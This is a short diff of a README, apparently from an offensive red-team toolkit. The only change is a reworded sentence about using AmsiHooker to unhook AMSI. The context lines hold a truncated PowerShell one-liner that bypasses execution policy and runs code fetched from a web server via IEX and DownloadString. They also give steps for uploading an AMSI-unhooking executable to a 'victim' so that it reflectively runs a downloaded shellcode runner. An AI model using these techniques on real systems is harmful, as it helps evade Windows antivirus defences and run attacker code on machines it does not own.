@@ -113,7 +113,7 @@ powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('h
 ``` 
 
 #### Method 2
-To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I permfored some small changes. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
+To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I've done some small modifications. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.
 
 **Steps**
 1. Upload ```unhook_amsi.exe``` and ```MinHook.NET.dll``` to victim. (Files located under ```payloads/AMSI/```)
